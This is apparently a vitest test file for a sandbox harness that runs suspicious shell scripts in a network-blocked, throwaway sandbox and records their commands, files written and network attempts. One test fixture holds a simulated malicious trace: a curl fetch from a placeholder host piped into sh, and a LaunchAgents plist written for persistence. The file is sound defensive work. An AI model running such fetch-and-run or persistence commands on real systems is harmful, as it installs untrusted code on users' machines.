import { describe, expect, it, vi } from 'vitest'
import {
  SAMPLE_PATH,
  createSandbox,
  observeCommand,
  probeCommand,
  parseObservation,
  runSample,
  sha256Hex,
  withSandbox,
  type CreateParams,
  type SandboxClient,
  type SandboxLike
} from './daytona'

const b64 = (s: string): string => Buffer.from(s).toString('base64')

function fakeSandbox(
  over: Partial<SandboxLike> & { files?: Map<string, Buffer> } = {}
): SandboxLike {
  const files = over.files ?? new Map<string, Buffer>()
  return {
    id: 'sbx-1',
    networkBlockAll: true,
    fs: {
      createFolder: vi.fn(async () => undefined),
      uploadFile: vi.fn(async (file: Buffer, path: string) => {
        files.set(path, file)
      })
    },
    process: {
      executeCommand: vi.fn(async (cmd: string) => {
        if (cmd.startsWith('sha256sum ')) {
          const f = files.get(SAMPLE_PATH)
          return { exitCode: 0, result: `${f ? sha256Hex(f) : ''}  ${SAMPLE_PATH}\n` }
        }
        return { exitCode: 0, result: 'BLOCKED\n' }
      })
    },
    delete: vi.fn(async () => undefined),
    ...over
  }
}

function fakeClient(
  sandbox: SandboxLike,
  failFirst = false
): SandboxClient & { calls: CreateParams[] } {
  const calls: CreateParams[] = []
  let n = 0
  return {
    calls,
    create: vi.fn(async (params: CreateParams) => {
      calls.push(params)
      if (failFirst && n++ === 0) throw new Error('slow start')
      return sandbox
    })
  }
}

describe('createSandbox', () => {
  it('turns the network off at creation, ephemeral, with Aegis labels', async () => {
    const client = fakeClient(fakeSandbox())
    const s = await createSandbox(client, { labels: { job: 'test' } })
    expect(client.calls[0]).toMatchObject({
      networkBlockAll: true,
      ephemeral: true,
      labels: { app: 'aegis', job: 'test' }
    })
    expect(s.log[0]).toMatchObject({ step: 'create', ok: true })
  })

  it('retries a failed start once', async () => {
    const client = fakeClient(fakeSandbox(), true)
    const s = await createSandbox(client, { labels: {} })
    expect(client.calls).toHaveLength(2)
    expect(s.log[0].detail).toContain('2 attempts')
  })

  it('deletes and refuses a sandbox that comes back with the network on', async () => {
    const box = fakeSandbox({ networkBlockAll: false })
    await expect(createSandbox(fakeClient(box), { labels: {} })).rejects.toThrow(/network on/)
    expect(box.delete).toHaveBeenCalled()
  })
})

describe('withSandbox', () => {
  it('deletes the sandbox when the job succeeds', async () => {
    const box = fakeSandbox()
    const out = await withSandbox(fakeClient(box), { labels: {} }, async () => 42)
    expect(out).toMatchObject({ result: 42, deleted: true })
    expect(box.delete).toHaveBeenCalledOnce()
    expect(out.log.at(-1)).toMatchObject({ step: 'delete', ok: true })
  })

  it('deletes the sandbox when the job throws, and reports the error', async () => {
    const box = fakeSandbox()
    const out = await withSandbox(fakeClient(box), { labels: {} }, async () => {
      throw new Error('boom')
    })
    expect(out).toMatchObject({ error: 'boom', deleted: true })
    expect(box.delete).toHaveBeenCalledOnce()
  })
})

describe('SandboxSession.upload', () => {
  it('uploads the sample and meta, and checks the hash inside the sandbox', async () => {
    const box = fakeSandbox()
    const s = await createSandbox(fakeClient(box), { labels: {} })
    const meta = await s.upload(Buffer.from('echo hi\n'), {
      filename: 'a.sh',
      url: null,
      referrer: null,
      contentType: null
    })
    expect(meta.sha256).toBe(sha256Hex(Buffer.from('echo hi\n')))
    expect(box.fs.uploadFile).toHaveBeenCalledTimes(2)
  })

  it('fails when the sandbox holds different bytes', async () => {
    const box = fakeSandbox({
      process: { executeCommand: vi.fn(async () => ({ exitCode: 0, result: 'deadbeef  x\n' })) }
    })
    const s = await createSandbox(fakeClient(box), { labels: {} })
    await expect(
      s.upload(Buffer.from('x'), { filename: 'x', url: null, referrer: null, contentType: null })
    ).rejects.toThrow(/upload check failed/)
  })
})

describe('probeCommand', () => {
  it('caps every tool with timeout and stops wget retrying', () => {
    const cmd = probeCommand('https://example.com')
    expect(cmd.match(/timeout -k 1 8 /g)).toHaveLength(3)
    expect(cmd).toContain('--tries=1')
  })
})

describe('running a sample', () => {
  it('runs it with a scratch HOME, AEGIS_SANDBOX=1, sh -x and a time limit', () => {
    const cmd = observeCommand(30)
    expect(cmd).toContain('env -i')
    expect(cmd).toContain('AEGIS_SANDBOX=1')
    expect(cmd).toContain('HOME=/tmp/aegis-run/home')
    expect(cmd).toContain('timeout -k 2 30 sh -x')
  })

  it('parses commands, files written and network attempts', () => {
    const stderr = [
      '+ echo Installing',
      '+ curl -fsSL https://x.invalid/s.sh',
      '+ sh',
      'curl: (6) Could not resolve host: x.invalid',
      '+ mkdir -p /tmp/aegis-run/home/Library/LaunchAgents',
      '+ wget -q -O /dev/null https://y.invalid'
    ].join('\n')
    const out = [
      '@@exit',
      b64('4\n'),
      '@@stdout',
      b64('Installing\n'),
      '@@stderr',
      b64(stderr),
      '@@files',
      b64('home/Library/LaunchAgents/a.plist\n'),
      ''
    ].join('\n')
    const obs = parseObservation(out)
    expect(obs.exitCode).toBe(4)
    expect(obs.timedOut).toBe(false)
    expect(obs.commands).toHaveLength(5)
    expect(obs.filesWritten).toEqual(['home/Library/LaunchAgents/a.plist'])
    expect(obs.networkAttempts).toEqual([
      'curl -fsSL https://x.invalid/s.sh',
      'wget -q -O /dev/null https://y.invalid'
    ])
  })

  it('handles empty output sections and marks a timeout', () => {
    const obs = parseObservation(
      ['@@exit', b64('124'), '@@stdout', '', '@@stderr', '', '@@files', ''].join('\n')
    )
    expect(obs).toMatchObject({ exitCode: 124, timedOut: true, stdout: '', filesWritten: [] })
  })

  it('throws when the sandbox printed nothing usable', () => {
    expect(() => parseObservation('bash: base64: not found')).toThrow(/no result/)
  })

  it('logs the run with what the sample did', async () => {
    const out = [
      '@@exit',
      b64('0'),
      '@@stdout',
      b64('ok'),
      '@@stderr',
      b64('+ echo ok'),
      '@@files',
      ''
    ].join('\n')
    const box = fakeSandbox({
      process: { executeCommand: vi.fn(async () => ({ exitCode: 0, result: out })) }
    })
    const s = await createSandbox(fakeClient(box), { labels: {} })
    const obs = await runSample(s, 5)
    expect(obs.commands).toEqual(['echo ok'])
    expect(s.log.at(-1)).toMatchObject({ step: 'run sample', ok: true, exitCode: 0 })
  })
})
